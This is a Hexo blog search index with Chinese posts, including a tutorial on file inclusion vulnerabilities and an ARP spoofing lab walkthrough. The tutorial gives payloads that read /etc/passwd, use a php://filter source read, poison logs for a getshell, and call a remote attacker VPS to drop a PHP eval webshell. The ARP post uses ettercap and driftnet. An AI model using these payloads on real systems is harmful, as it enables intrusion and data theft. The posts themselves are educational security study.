<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初识共识算法</title>
      <link href="/2021/08/18/%E5%88%9D%E8%AF%86%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2021/08/18/%E5%88%9D%E8%AF%86%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f526a23e22a41127c79cb887064a277aec64d9f332df8595b4208a6e5f844933"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
          <category> 共识算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 共识算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的一些简单操作</title>
      <link href="/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作 </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件包含漏洞</title>
      <link href="/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>任意文件读取漏洞是通过一些手段可以<strong>读取服务器上开发者不允许读到的文件</strong>。<br>主要包括的文件类型有：</p><ol><li>服务器的各种配置文件</li><li>以文件形式存储的密钥</li><li>服务器信息<ul><li>正在执行的进程信息</li><li>……</li></ul></li><li>历史命令</li><li>网络信息</li><li>应用源码及二进制程序</li><li>……</li></ol><p>以上文件内容通过任意文件读取漏洞可以作为信息收集的强有力的补充。</p><p>任意文件读取漏洞的成因：</p><ul><li>开发人员对于意外情况考虑不足所致，从本质上来看文件读取漏洞的存在与不是语言本身的问题。</li><li>对于<strong>Web应用框架或中间</strong>件的二次开发中不了解其<strong>安全机制</strong>，造成任意文件读取漏洞的形成。<ul><li>主要漏洞挖掘的方式是通过“调用链”进行溯源。</li></ul></li><li>由<strong>Web Server自身的问题或不安全的服务器配置</strong>导致的任意文件读取漏洞<ul><li><strong>Web Server运行的基本机制</strong>是从服务器中读取代码或资源文件，再把代码类文件传送给解释器或CGI程序执行，然后将执行的结果和资源文件反馈给客户端用户，而存在于其中的<strong>众多文件操作很可能被攻击者干预</strong>，进而造成诸如非预期读取文件、错误地把代码类文件当作资源文件等情况的发生。</li></ul></li></ul><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><h3 id="Web语言相关"><a href="#Web语言相关" class="headerlink" title="Web语言相关"></a>Web语言相关</h3><p>不同Web语言由于语言上的特性，导致存在任意文件包含漏洞时的漏洞触发点不同。</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>作为世界上最好的语言，PHP的任意文件读取漏洞触发点可以分为</p><h5 id="函数相关"><a href="#函数相关" class="headerlink" title="函数相关"></a>函数相关</h5><ol><li><p>PHP标准函数中与文件操作相关的函数</p><ul><li>file_get_contents()</li><li>file()</li><li>fopen()</li><li>与文件包含相关的函数：</li><li><ul><li>include()</li></ul></li><li><ul><li>required()</li></ul></li><li><ul><li>……</li></ul></li><li>系统命令执行函数</li><li><ul><li>system()</li></ul></li><li><ul><li>exec()</li></ul></li><li><ul><li>……</li></ul></li></ul></li><li><p>PHP拓展中与文件相关的函数<br>例如：</p></li></ol><ul><li>PHP-curl拓展</li><li>……</li></ul><h5 id="协议（Wrapper）相关"><a href="#协议（Wrapper）相关" class="headerlink" title="协议（Wrapper）相关"></a>协议（Wrapper）相关</h5><p>与其他语言不同，PHP打开文件的方式不仅仅是简单的路径，而是通过<strong>文件流</strong>的方式打开文件。<br>可以简单的理解为PHP提供了一套协议来完成文件的打开。最有特色的就是：<code>php://</code>协议。</p><p>PHP中还提供了接口供开发者编写自己的Warrper（stream_wrapper_register）</p><h5 id="Filter机制"><a href="#Filter机制" class="headerlink" title="Filter机制"></a>Filter机制</h5><p>Filter机制的作用是对目前的Warrper进行一定的处理。<br>对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。而PHP内置的一些Wrapper会自带一些Filter。</p><p>假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行，这样php文件的内容就无法作为可视文本形式泄露，通过<strong>使用Filter可以避免这种情况</strong>。</p><p>比较常见的<strong>Base64相关的Filter可将文件流编码成Base64</strong>的形式，这样读取的文件内容中就不会存在PHP标签。</p><p>如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。</p><p>当然，这些PHP默认携带的Wrapper和Filter都可以<strong>通过php.ini禁用</strong>。</p><h5 id="PHP文件包含的实际情况"><a href="#PHP文件包含的实际情况" class="headerlink" title="PHP文件包含的实际情况"></a>PHP文件包含的实际情况</h5><ol><li>文件路径前面可控后面不可控<ul><li>使用<code>%00</code>截断，将不可控后部截掉。</li><li>若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。</li></ul></li><li>文件路径后面可控前面不可控<ul><li>使用<code>../</code>进行目录穿越，进而直接读取文件。</li><li>如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。</li></ul></li><li>文件路径中间可控<ul><li>类似第一种，但是不能使用Wrapper进行文件包含。</li></ul></li></ol><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>Python的Web应用更多地倾向于通过其自身的模块启动服务，同时<strong>搭配中间件、代理服务</strong>将整个Web应用呈现给用户。</p><p>用户和Web应用交互的过程<strong>本身就包含对服务器资源文件的请求</strong>，所以容易出现非预期读取文件的情况。</p><p>因此，层出不穷的Python某框架任意文件包含漏洞也是因为<strong>缺乏统一的资源文件交互的标准</strong>。</p><ol><li><p>非预期请求<br>Python的任意文件包含漏洞经常出现在请求静态资源文件的部分，也就是最后读取文件内容的open函数，原因是开发者常常忽略Python函数的feature。</p></li><li><p>目录穿越<br>很多开发者通过判断用户传入的路径<strong>不包含</strong><code>.</code>来保证用户在读取资源时不会发生目录穿越，随后将用户的输入代入<code>os.path.join</code>的第二个参数，<strong>但是如果用户传入<code>/</code>，则依然可以穿越到根目录，进而导致任意文件包含。</strong></p></li></ol><p>很多涉及文件操作的应用也很有可能因为滥用open函数、模板的不当渲染导致任意文件包含。</p><p>比如，<strong>将用户输入的某些数据作为文件名的一部分</strong>（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过<strong>将经过处理的用户输入数据作为索引去查找相关文件</strong>，这就给了攻击者一个进行目录穿越的途径。</p><ol start="3"><li><p>不安全解压导致文件覆盖</p><ul><li>Python开发者调用不安全的解压模块进行压缩文件解压，而导致文件解压后可进行目录穿越。解压文件时的目录穿越的危害是覆写服务器已有文件（特别是配置文件）</li><li>攻击者<strong>构造软链接</strong>放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。</li></ul></li><li><p>其他<br>此外，Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件包含，当然，其<strong>最大危害仍然是导致任意命令执行</strong>。</p></li></ol><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><h3 id="中间件、服务器相关"><a href="#中间件、服务器相关" class="headerlink" title="中间件、服务器相关"></a>中间件、服务器相关</h3><ol><li>中间件、服务器的错误配置导致文件读取漏洞</li><li>数据库的不恰当权限管理导致结合<code>load_file()</code>函数（或者load data infile）导致任意文件包含漏洞</li><li>上传软链接实现任意文件包含</li><li>……</li></ol><h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><p>客户端也存在文件包含漏洞，大多是<strong>基于XSS漏洞包含本地文件</strong>。</p><ol><li>浏览器/Flash XSS</li><li>MarkDown语法解析器XS</li></ol><p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><p>主要有两种情况：</p><ol><li>当被包含的文件在服务器本地时，就形成了本地文件包含漏洞。</li><li>服务器远程包含一个恶意文件时，就形成了远程文件包含漏洞。</li></ol><h2 id="漏洞利用及其利用条件"><a href="#漏洞利用及其利用条件" class="headerlink" title="漏洞利用及其利用条件"></a>漏洞利用及其利用条件</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>Local File Include(本地文件包含漏洞)</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>include()等函数通过<strong>动态变量的方式引入包含文件</strong>； </li><li><strong>用户能够控制</strong>该动态变量。</li></ol><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li><p>读取敏感文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=/etc/passwd </span><br></pre></td></tr></table></figure><p>通过对敏感文件的读取，获得服务器信息，可作为信息收集的强有力补充。</p></li><li><p>利用封装协议读取源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><p>通过对php伪协议中的filter机制的利用，绕过对php文件的解析，获得源码的base64编码，解码后可查看源码</p></li><li><p>包含图片GetShell<br>在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p></li><li><p>截断包含<br>同前面介绍的情况类似</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 文件路径前面可控后面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`%00`</span>截断，将不可控后部截掉。</span><br><span class="line"><span class="bullet">-</span> 若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径后面可控前面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`../`</span>进行目录穿越，进而直接读取文件。</span><br><span class="line"><span class="bullet">-</span> 如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径中间可控</span><br><span class="line"><span class="bullet">-</span> 类似第一种，但是不能使用Wrapper进行文件包含。</span><br></pre></td></tr></table></figure></li><li><p>包含Apache日志Getshell</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件：知道日志文件access.log的存放位置 ，默认位置：/var/log/httpd/access.log</span><br></pre></td></tr></table></figure><p><code>access.log</code>文件记录了客户端每次请求的相关信息； 当我们访问一个不存在的资源时<code>access.log</code>文件仍然会记录这条资源信息。</p><p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，我们就可以尝试访问<code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;</code></p><p>Apache会将这条信息记录在<code>access.log</code>文件中，这时如果我们访问<code>access.log</code>文件，就会触发文件包含漏洞。理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p><p>攻击者可以通过<code>burpsuite</code>进行抓包在http请求包里面将转义的代码改为正常的测试代码就可以绕过。这时再查看Apache日志文件，显示的就是正常的测试代码。</p><p>这时访问：<code>http://www.vuln.com/index.php?arg=/var/log/httpd/access.log</code>，即可成功执行代码</p></li></ol><h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>Remote File Include(远程文件包含漏洞 )</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p><h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li>远程包含WebShell<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>……</li></ol><p>在PHP中，文件包含用到的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">inclue_once()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ol><li><a href="https://wiki.wgpsec.org/knowledge/web/fileincludes.html#php%E4%B8%AD%E7%9A%84%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE-%E4%BC%AA%E5%8D%8F%E8%AE%AE">关于php伪协议以及filter机制（外链）</a></li><li><a href="null">PHP代码审计（未上传）</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 任意文件包含漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗原理及实现</title>
      <link href="/2021/07/19/ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/07/19/ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ARP协议"><a href="#1-ARP协议" class="headerlink" title="1 ARP协议"></a>1 ARP协议</h2><h3 id="1-1-基础知识"><a href="#1-1-基础知识" class="headerlink" title="1.1 基础知识"></a>1.1 基础知识</h3><blockquote><p>在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。        – Extracted from WikiPedia.</p></blockquote><p>通俗点说，在局域网中通信时使用的是MAC地址，而不是常见的IP地址。所以在局域网的两台主机间通信时，必须要知道对方的MAC地址，这就是ARP协议要做的事：将IP地址转换为MAC地址。</p><p>从以太网帧来看，以太网帧分为：</p><ul><li>以太网首部</li><li>上层数据部分</li><li>以太网尾</li></ul><p>在物理层传输的数据都是使用以太网帧来封装起来传输的（通俗的说就是在数据包头加上以太网首部，数据包尾加上以太网尾），而网络传输是分层进行的，也就是物理层只处理物理层的数据，对于以太网帧中的上层数据部分并不关心。</p><p>在以太网帧中，以太网首部中存放了目的主机的MAC地址和源主机的MAC用于在以太网中传输数据。所以，在以太网通信中，只知道对方的IP地址是不可以通信的，因为IP地址属于第三层（网络层）的地址，对于物理层的以太网帧来说IP地址属于上层数据部分，以太网是无法识别的，所以就要使用ARP协议获取到对方的MAC地址进行通信。</p><h3 id="1-2-工作原理"><a href="#1-2-工作原理" class="headerlink" title="1.2 工作原理"></a>1.2 工作原理</h3><p>举例：现在有两台处于同一局域网的主机A、B。  </p><table><thead><tr><th align="center">主机</th><th align="center">IP地址</th><th align="center">MAC地址</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">192.168.1.1</td><td align="center">0A-11-22-33-44-01</td></tr><tr><td align="center">B</td><td align="center">192.168.1.2</td><td align="center">0A-11-22-33-44-02</td></tr></tbody></table><p>现在主机A要和主机B通信，那么根据上面的介绍可以知道，主机A仅有主机B的IP地址是不可以通信的，还要知道主机B的MAC地址，下面介绍主机A是如何通过ARP协议获取主机B的MAC地址的：</p><ul><li>第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</li><li>第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP<strong>请求帧广播到本地网络上的所有主机</strong>。<u>源主机A的IP地址和MAC地址都包括在ARP请求中</u>。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求</li><li>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</li><li>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</li><li>第5步：当<u>主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。</u><strong>本机缓存是有生存期的，生存期结束后，将再次重复上面的过程</strong>。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</li></ul><p>了解ARP协议的工作原理后可以分析出其存在一个严重的安全问题：</p><p>在ARP回复时，发送请求包的主机A并不会验证ARP回复包的真实性，也就是不能判断回复主机A的是不是主机B。由此引出一个局域网攻击方式ARP欺骗。</p><h2 id="2-ARP欺骗"><a href="#2-ARP欺骗" class="headerlink" title="2 ARP欺骗"></a>2 ARP欺骗</h2><h3 id="2-1-ARP欺骗"><a href="#2-1-ARP欺骗" class="headerlink" title="2.1 ARP欺骗"></a>2.1 ARP欺骗</h3><p>举例：</p><br/><table><thead><tr><th align="center">主机</th><th align="center">IP地址</th><th align="center">MAC地址</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">192.168.1.1</td><td align="center">0A-11-22-33-44-01</td></tr><tr><td align="center">B</td><td align="center">192.168.1.2</td><td align="center">0A-11-22-33-44-02</td></tr><tr><td align="center">C</td><td align="center">192.168.1.3</td><td align="center">0A-11-22-33-44-03</td></tr></tbody></table><br/><ul><li>1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1。</li><li>2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02。</li><li>3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02。</li></ul><h3 id="2-2-ARP欺骗分类"><a href="#2-2-ARP欺骗分类" class="headerlink" title="2.2 ARP欺骗分类"></a>2.2 ARP欺骗分类</h3><ul><li>1.主机欺骗：欺骗对象为主机。</li><li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li></ul><h3 id="2-3-ARP攻击的危害"><a href="#2-3-ARP攻击的危害" class="headerlink" title="2.3 ARP攻击的危害"></a>2.3 ARP攻击的危害</h3><ul><li>1.造成局域网中的其他主机断网。</li><li>2.劫持局域网中其他主机或网关的流量，获取敏感信息等。</li></ul><h2 id="3-ARP欺骗实现"><a href="#3-ARP欺骗实现" class="headerlink" title="3 ARP欺骗实现"></a>3 ARP欺骗实现</h2><h3 id="3-1-使用“轮子”"><a href="#3-1-使用“轮子”" class="headerlink" title="3.1 使用“轮子”"></a>3.1 使用“轮子”</h3><p>已有轮子有：</p><ul><li>arpspoof</li><li>ettercap</li><li>……</li></ul><p>接下来开始实验。</p><p>网络拓扑环境：</p><p>网关：win10 192.168.177.2</p><p>攻击者主机：kali linux  ip:192.168.177.128</p><p>受害者主机：win7  ip:192.168.177.129</p><p>未攻击前受害者主机状态：</p><p><img src="1626662533037.png"></p><p>攻击机开始前状态：</p><p><img src="1626662553832.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forword <span class="comment"># 启用流量转发，这样被攻击机就不会断网</span></span><br></pre></td></tr></table></figure><p>开始攻击。</p><p>通过ARP欺骗，建立 靶机–&gt;kali攻击机–&gt;网关的连接</p><p>首先使用<code>ettercap -G</code>指令启动图形化界面</p><p><img src="1626662570761.png"></p><p>点击<code>√</code>，进入如下页面：</p><p><img src="1626662585449.png"></p><p>点击搜索受害主机。</p><p><img src="1626662599188.png"></p><p>发现目标，将网关添加到target1，目标添加到target2.</p><p><img src="1626662618314.png"></p><p>加载remote_broser插件</p><p><img src="1626662634872.png"></p><p>选择远程攻击模块：</p><p><img src="1626662650863.png"></p><p>进入靶机：</p><p><img src="1626662663529.png"></p><p>arp欺骗成功。</p><ul><li>自动加载靶机图片</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet</span><br><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><p>会出现一个黑窗口。</p><h3 id="3-2-自己编写程序"><a href="#3-2-自己编写程序" class="headerlink" title="3.2 自己编写程序"></a>3.2 自己编写程序</h3><p>这一部分后续有时间会更新</p>]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
          <category> ARP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议 简单了解HTTP协议</title>
      <link href="/2021/07/19/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/07/19/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7ed04ce90693535cd4b7718820c510a1760834876857ffe35981628a5e51dda2">4af8291d7d4bfe809382abee478622f730fb2cf3a5b3f91739843be8e8bb47a0d1eca2adcd9f332d506bab1ba2ff6fe120b93a3ae2187e17989cfd20d60941a6a2941ac1c07142ac4f3289a9070a30c266b70915bd0d36b4af046e5b32ccf598e7d7f15518046cb8b4ddbc4dc6662ca247dc6fb12b7de799be490c9c7629c49cf1d787557629b6cd8dc1750713126dac2947b3994366994ce41d48ca97e183ff132b03f368ddb33547b776600cde586262b84da23e3deedbc824512b5e2c56a77ba6f9ee118691d1ab9ddc2e38fe6a1ed0f62021dba01ae44c16e48f5113d4e9ac4f178af6a24cb47b10243c7d51456ff891ddb47bd665ddcc4d4151e93c8263c9b7a734979f96ea95321dcc55aea89ce1f7035db59f59c6152ce3744266fecd2c044a53babcb7b7c3b9b058288f7c7d226588abd529943137c09353dfa34f2296d6616876cccd952cc3f92c82530088d0e504deb963d207743458dbe09e908c0fca4339bda8cab675dc3ac75ac971e6e6b5dff8ed9c6c0fbed064b91c7fc54a46b1421942dfbb1071f8e02dd36e2f878a9ef828b57c1bf2c1e3010ded59e7a6c67604f561317d37f9c909720eaa4d4f0526314184502316c4c452ae66ccad2c6b7cdf6c2b6a17f810727f27c4f6457ef528c389ffe070eef0566a425c6eaf9c6cabc3efdc8e74a5d1afbe4d45e98b66459548ce2a0dd336792192b8f1f4242efeab62f55d0e796a0d037a18ee51d39250826e6a135065d79efdd6a1f1af38b275cdfd64e44279a40844a4466a2a58b1229c21cebbb029c6e531d715da42412172077c5cd93bc6d1ef03237bdf939cf6b47a71cfdcb8e672090aeac6f9885103f7f238f10a12a071749a5ccde8263586e14138ec900a1e2b733734b1c0f00e6c4d6a0ce152eb5d01dde5e384b208372b469103c04f0e44064baaaff3ede3c6f484a69f0ac75a2df7da7628c55c1ae234e5341128f44b724079fe39f8cb75cfcb3d06e018e01bb33f11a26f0348137d66dc1fb415e7bfe1bf6d79264b9ad3dd5fb27f8c029c2224f4a3c9d8d0abd2f4a941e6939abae2c12d3378b80e0b6392fb0743e3a08173e53c5176b9df71319130869f61197419c628b2b47e1bed216ed43a847d119121eb591bb84ff1519f1d7f8a7e44012620a71993eed25b5f8b08c834a07d8899051ef26f33fc5f3e90608f10c5d17a81013cfd3d14acd22737f8884d4ab6636f59bb533e991a248a235b964ec77ca762845b8325d7f26990237cd47c8c2f053c0b1de88097fcbbea95c30bf16f5d1c4aa42def88b2c445c9b5de5dcde5ab58f03b18605fc517f19f561826061f938ddd70e2edf6096d4b37cad491d2de89715a7dea1611b7b9496c676aaf01286680bce6595430f1699a200e29b72c3bd6055d0ca504db9c600d1d72b76fef5254836059ab7af02e590f74d62a3993783e9b155e2091d5af96e909410cff0232094713770d696e98ad8f07264cddb3352a1fe1091828cf1f06a287ac8f3f44d41f02823c7d430c9a700c230fd47b1169deb894525c047bd081aa4edf3ab8cce5db4467167a18cacd1448b111e30d7796a86672c85eb06685d4c36fe2f6a7e7f44360b8c2e87de91145acfef8d804e425fd6b862d1064c47b30f8f9c9731e59a68653e6f3428cadba7b3999b2ff85ffdf590edbd4ac82f2437ebf5c3e4d56a5678dab94b65d5066977daef44a888fa22ee6cd08a4a27998daa14dfde81ddcd8c8d0681498f17da9dd30bed82709aa1b331c0e5ca3d452a51eadc05c2bd19ea03f99751e795005822504215d3fc28db3c8d1903f630634bfaee7485fcf156bbdbfd728ae3ef674a3e4278486c231a2653836791c7de989e676de0355f6d35485bbcecc9231016383423e5abaf9d96441f03f1759d5cd910705dbad0b6ad61a696caafbf7a4d9cc26f18c00409e587a2a7558676c00081e6e39956492f83e4b1f0c1bf017689a2fc5e3b55201395d9c7a3b26baaaa0a4e8028de3e889d80099da89b27a4f06ad49631a9fd585fe5274647453c0a78bb5b00f32eb389b20388546efde68405a848e0ea2b5e90079b7d9deb578593235a018b71980d